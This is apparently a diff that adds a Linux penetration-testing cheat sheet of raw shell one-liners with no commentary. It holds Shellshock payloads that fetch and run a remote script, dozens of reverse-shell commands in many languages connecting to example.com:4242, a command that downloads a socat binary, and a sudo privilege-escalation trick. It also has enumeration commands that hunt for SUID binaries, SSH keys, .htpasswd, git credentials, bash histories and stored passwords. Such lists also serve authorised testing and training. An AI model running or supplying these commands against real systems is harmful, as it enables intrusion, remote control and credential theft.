@@ -1,0 +1,123 @@
+() { :;}; /bin/bash -c \"cd /tmp;wget http://example.com/ji;curl -O /tmp/ji http://example.com/ji ; perl /tmp/ji;rm -rf /tmp/ji\"
+() { :;}; /bin/bash -c ‘nc 192.168.234.166 1337 -e /bin/sh’
+gcc exploit.c -o exploit
+find . -iname .ssh > triznadm/sshlist 2>/dev/null
+for i in $(cat triznadm/sshlist); do ls -la $i | grep -i id; done 2>/dev/null
+find / -perm -1000 -type d 2>/dev/null
+find / -perm -g=s -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
+for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done
+find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
+find / -writable -type d 2>/dev/null
+find / -perm -222 -type d 2>/dev/null
+find / -perm -o w -type d 2>/dev/null
+find / -perm -o x -type d 2>/dev/null
+find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
+grep -C 5 "password" [filename]
+find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password" 
+grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
+awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
+find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print
+find /dir -xdev \( -nouser -o -nogroup \) -print
+ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null
+ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null
+ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null
+ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null
+find /etc/ -readable -type f 2>/dev/null
+find /etc/ -readable -type f -maxdepth 1 2>/dev/null
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+python2 -c 'import pty; pty.spawn("/bin/sh")'
+python3 -c "__import__('pty').spawn('/bin/bash')"
+python3 -c "__import__('subprocess').call(['/bin/bash'])"
+perl -e 'exec "/bin/sh";'
+perl: exec "/bin/sh";
+perl -e 'print `/bin/bash`'
+ruby: exec "/bin/sh"
+lua: os.execute('/bin/sh')
+nmap --interactive
+/usr/bin/script -qc /bin/bash /dev/null
+lua -e "require('socket');require('os');t=socket.tcp();t:connect('example.com','4242');os.execute('/bin/sh -i <&3 >&3 2>&3');"
+awk 'BEGIN {s = "/inet/tcp/0/example.com/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+export RHOST="example.com"; export RPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; export PIPE="/tmp/`openssl rand -hex 4`"; mkfifo $PIPE; /bin/sh -i < $PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT > $PIPE; rm $PIPE
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect example.com:4242 > /tmp/s; rm /tmp/s
+ncat example.com 4242 -e /bin/bash
+ncat --udp example.com 4242 -e /bin/bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc example.com 4242 >/tmp/f
+nc -e /bin/sh example.com 4242
+nc -e /bin/bash example.com 4242
+nc -c bash example.com 4242
+echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","example.com:4242");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
+ruby -rsocket -e'f=TCPSocket.open("example.com",4242).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("example.com","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+php -r '$sock=fsockopen("example.com",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("example.com",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("example.com",4242);`/bin/sh -i <&3 >&3 2>&3`;'
+php -r '$sock=fsockopen("example.com",4242);system("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("example.com",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("example.com",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
+python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("example.com",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("example.com",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+export RHOST="example.com";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+perl -e 'use Socket;$i="example.com";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"example.com:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:example.com:4242
+wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:example.com:4242
+sh -i >& /dev/udp/example.com/4242 0>&1
+nc -u -lvp 4242
+bash -i >& /dev/tcp/example.com/4242 0>&1
+0<&196;exec 196<>/dev/tcp/example.com/4242; sh <&196 >&196 2>&196
+python -c 'import os; os.system("/bin/sh")'
+sudo -u#-1 /bin/bash
+mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.5.5.151 80 >backpipe
+mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe
+mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe 
+binarylist='aria2c\|arp\|ash\|awk\|base64\|bash\|busybox\|cat\|chmod\|chown\|cp\|csh\|curl\|cut\|dash\|date\|dd\|diff\|dmsetup\|docker\|ed\|emacs\|env\|expand\|expect\|file\|find\|flock\|fmt\|fold\|ftp\|gawk\|gdb\|gimp\|git\|grep\|head\|ht\|iftop\|ionice\|ip$\|irb\|jjs\|jq\|jrunscript\|ksh\|ld.so\|ldconfig\|less\|logsave\|lua\|make\|man\|mawk\|more\|mv\|mysql\|nano\|nawk\|nc\|netcat\|nice\|nl\|nmap\|node\|od\|openssl\|perl\|pg\|php\|pic\|pico\|python\|readelf\|rlwrap\|rpm\|rpmquery\|rsync\|ruby\|run-parts\|rvim\|scp\|script\|sed\|setarch\|sftp\|sh\|shuf\|socat\|sort\|sqlite3\|ssh$\|start-stop-daemon\|stdbuf\|strace\|systemctl\|tail\|tar\|taskset\|tclsh\|tee\|telnet\|tftp\|time\|timeout\|ul\|unexpand\|uniq\|unshare\|vi\|vim\|watch\|wget\|wish\|xargs\|xxd\|zip\|zsh'
+bash linenum.sh
+find /home -name .sudo_as_admin_successful 2>/dev/null
+find / -writable ! -user \whoami\ -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
+find / -user \whoami\ -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
+find / -name ".*" -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
+find /home/ -perm -4 -type f -exec ls -al {} \; 2>/dev/null
+find / \( -name "id_dsa*" -o -name "id_rsa*" -o -name "known_hosts" -o -name "authorized_hosts" -o -name "authorized_keys" \) -exec ls -la {} 2>/dev/null \;
+find /etc/cron* -perm -0002 -type f -exec ls -la {} \; -exec cat {} 2>/dev/null \;
+find /etc/init.d/ \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null
+find /etc/rc.d/init.d \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null
+find /usr/local/etc/rc.d \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null
+find /etc/init \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null
+find /lib/systemd/ \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null
+find / -name .htpasswd -print -exec cat {} \; 2>/dev/null
+find / -perm -4000 -type f 2>/dev/null
+find $allsuid -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
+for i in $findsuid; do cp $i $format/suid-files/; done 2>/dev/null
+find $allsuid -perm -4000 -type f -exec ls -la {} \; 2>/dev/null | grep -w $binarylist 2>/dev/null
+find $allsuid -perm -4002 -type f -exec ls -la {} 2>/dev/null \;
+find $allsuid -uid 0 -perm -4002 -type f -exec ls -la {} 2>/dev/null \;
+find / -perm -2000 -type f 2>/dev/null
+find $allsgid -perm -2000 -type f -exec ls -la {} 2>/dev/null \;
+for i in $findsgid; do cp $i $format/sgid-files/; done 2>/dev/null
+find $allsgid -perm -2000 -type f  -exec ls -la {} \; 2>/dev/null | grep -w $binarylist 2>/dev/null
+find $allsgid -perm -2002 -type f -exec ls -la {} 2>/dev/null \;
+find $allsgid -uid 0 -perm -2002 -type f -exec ls -la {} 2>/dev/null \;
+find / -name ".git-credentials" 2>/dev/null
+find / ! -path "*/proc/*" ! -path "/sys/*" -perm -2 -type f -exec ls -la {} 2>/dev/null \;
+find /home -iname *.plan -exec ls -la {} \; -exec cat {} 2>/dev/null \;
+find /usr/home -iname *.plan -exec ls -la {} \; -exec cat {} 2>/dev/null \;
+find /home -iname *.rhosts -exec ls -la {} 2>/dev/null \; -exec cat {} 2>/dev/null \;
+find /usr/home -iname *.rhosts -exec ls -la {} 2>/dev/null \; -exec cat {} 2>/dev/null \;
+find /etc -iname hosts.equiv -exec ls -la {} 2>/dev/null \; -exec cat {} 2>/dev/null \;
+find / -maxdepth 4 -name *.conf -type f -exec grep -Hn $keyword {} \; 2>/dev/null
+find / -maxdepth 4 -name *.conf -type f -exec grep -lHn $keyword {} \; 2>/dev/null
+find / -maxdepth 10 -name *.php -type f -exec grep -Hn $keyword {} \; 2>/dev/null
+find / -maxdepth 10 -name *.php -type f -exec grep -lHn $keyword {} \; 2>/dev/null
+find / -maxdepth 4 -name *.log -type f -exec grep -Hn $keyword {} \; 2>/dev/null
+find / -maxdepth 4 -name *.log -type f -exec grep -lHn $keyword {} \; 2>/dev/null
+find / -maxdepth 4 -name *.ini -type f -exec grep -Hn $keyword {} \; 2>/dev/null
+find / -maxdepth 4 -name *.ini -type f -exec grep -lHn $keyword {} \; 2>/dev/null
+find /etc/ -maxdepth 1 -name *.conf -type f -exec ls -la {} \; 2>/dev/null
+find /home -name .bash_history -print -exec cat {} 2>/dev/null \;
+find / -name *.bak -type f 2</dev/null
+grep -i docker /proc/self/cgroup  2>/dev/null; find / -name "*dockerenv*" -exec ls -la {} \; 2>/dev/null
+find / -name Dockerfile -exec ls -l {} 2>/dev/null \;
+find / -name docker-compose.yml -exec ls -l {} 2>/dev/null \;
